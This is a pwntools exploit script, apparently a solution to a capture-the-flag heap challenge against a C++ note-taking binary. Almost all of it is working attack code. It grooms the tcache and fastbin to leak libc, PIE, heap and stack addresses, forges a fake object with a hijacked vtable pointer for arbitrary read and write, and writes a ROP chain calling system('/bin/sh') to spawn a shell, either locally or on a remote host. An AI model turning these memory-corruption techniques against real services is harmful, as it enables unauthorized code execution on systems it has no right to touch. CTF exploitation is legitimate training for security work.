from pwn import *

exe = context.binary = ELF("./chall_patched")
libc = ELF("libc.so.6")
# ld = ELF("ld-2.39.so")
# libcpp = ELF("libstdc++.so.6")

gdbscript = '''
'''

pre_argv = []
post_argv = []


def get_conn(pre_argv, post_argv, gdbscript):
    host = args.HOST or 'localhost'
    port = int(args.PORT or 1337)
    cmd = pre_argv + [exe.path] + post_argv
    context.terminal = 'st'

    if args.REMOTE:
        p = remote(host, port)
    else:
        p = process(cmd)

    if args.GDB:
        gdb.attach(p)

    if args.DBG:
        p = gdb.debug(cmd, gdbscript=gdbscript)

    return p


def trace(func):
    def wrapper(*args, **kwargs):
        info(f"{func.__name__} {args} {kwargs}")
        return func(*args, **kwargs)
    return wrapper


p : tube = get_conn(pre_argv, post_argv, gdbscript)
r = lambda *a, **k: p.recv(*a, **k)
rl = lambda *a, **k: p.recvline(*a, **k)
ru = lambda *a, **k: p.recvuntil(*a, **k)
rr = lambda *a, **k: p.recvregex(*a, **k)
cl = lambda *a, **k: p.clean(*a, **k)
s = lambda *a, **k: p.send(*a, **k)
sa = lambda *a, **k: p.sendafter(*a, **k)
st = lambda *a, **k: p.sendthen(*a, **k)
sl = lambda *a, **k: p.sendline(*a, **k)
sla = lambda *a, **k: p.sendlineafter(*a, **k)
slt = lambda *a, **k: p.sendlinethen(*a, **k)
ia = lambda *a, **k: p.interactive(*a, **k)

ptr_protect = lambda pos, ptr: ptr ^ (pos >> 12)
ptr_mangle = lambda ptr, grd: rol(ptr ^ grd, 0x11)
ptr_demangle = lambda ptr, grd: ror(ptr, 0x11) ^ grd
i2b = lambda i: str(i).encode()


notes = []


def new_note(type):
    sla(b"choice: ", b"1")
    sla(b"choice: ", i2b(type))
    notes.append(type)


def list_notes():
    sla(b"choice: ", b"2")


def set_content(ind, data = b""):
    sla(b"choice: ", b"3")
    sla(b"content: ", i2b(ind))
    if ind >= 0 and notes[ind] == 1:
        return
    else:
        sla(b"Enter note: ", data)


def delete_note(ind):
    sla(b"choice: ", b"5")
    sla(b"delete: ", i2b(ind))
    notes.pop(ind)


def display_note(ind):
    sla(b"choice: ", b"4")
    sla(b"content: ", i2b(ind))
    ru(b"content: ")
    return rl()[:-1]


def unprotect(addr):
    for i in range(5, -1, -1):
        x = (addr & (0xFF << 8*i)) >> 12
        addr ^= x
    return addr


# dummy chunk to later trigger fastbin consolidation
new_note(3)
set_content(0, b"A" * 0x500)
delete_note(0)
# fill tcache bin and two chunks into fastbin
for i in range(9):
    new_note(1)
    set_content(i) # binary pointers in chunks
for i in range(9):
    delete_note(0)
# creatu large chunk to trigger consolidation
new_note(3)
set_content(0, b"B" * 0x500)

# using FixedNote to get libc and base address leaks
new_note(2)
libc_leak = u64(display_note(1)+b'\0\0') - 0x203b50
log.success(f"Libc leak: {libc_leak:#x}")
libc.address = libc_leak
set_content(1, b"A" * 8)
pie_leak = u64(display_note(1)[8:]+b'\0\0') - 0x52be
log.success(f"PIE leak: {pie_leak:#x}")

# similar idea to leak heap address
new_note(3)
for i in range(9):
    new_note(1)
for i in range(9):
    delete_note(3)
delete_note(0)
set_content(1, b"C" * 0x500)
new_note(2)
set_content(2, b"D" * 0x18)
heap_leak = u64(display_note(2)[0x18:]+b'\0\0')
heap_leak = unprotect(heap_leak)
log.success(f"Heap leak: {heap_leak:#x}")

# expand vector to trigger reallocate so vector is after chunks
for i in range(16):
    new_note(1)

# Fake DynamicNote chunk
fake_note = flat(
    pie_leak + 0x8CA0, # DynamicNote vtable
    libc.sym.environ, # pointer
    0x50, 0x80, # size, capacity
    heap_leak + 0x18 # pointer to fake note at index -31
)
set_content(2, fake_note)
stack_leak = u64(display_note(-31)[:8]) - 0x1e0
log.success(f"Stack leak: {stack_leak:#x}")

fake_note = flat(
    pie_leak + 0x8CA0,
    stack_leak,
    0x50, 0x80,
    heap_leak + 0x18
)
set_content(2, fake_note)

pop_rdi = libc_leak + 0x10f75b
ret     = libc_leak + 0x10f75c
binsh   = next(libc.search(b"/bin/sh\0"))

payload = flat(
    pop_rdi, binsh,
    ret,
    libc.sym.system
)
set_content(-31, payload)

ia()